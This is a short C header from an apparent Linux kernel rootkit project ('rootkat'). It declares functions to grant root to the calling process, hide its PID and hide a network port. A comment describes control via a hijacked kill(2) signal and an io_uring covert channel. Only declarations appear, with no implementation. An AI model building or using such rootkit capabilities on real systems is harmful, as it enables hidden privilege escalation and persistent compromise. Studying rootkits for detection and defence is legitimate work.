/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_MAGIC_ACTIONS_H
#define ROOTKAT_MAGIC_ACTIONS_H

#include <linux/types.h>

/*
 * Side-effects we expose through magic-control surfaces (the kill(2)
 * signal hijack and the io_uring covert channel). Factored so both
 * hooks call into the same primitives — keeps semantics identical
 * regardless of which channel the operator uses to reach them.
 *
 * `current` is the caller in all three cases — these run in the
 * syscall context (or io_uring submitter context, which inherits
 * the submitter's task struct).
 */

void rootkat_grant_root_to_current(void);
void rootkat_hide_current_pid(void);
void rootkat_hide_port_from_current(u16 port);

#endif
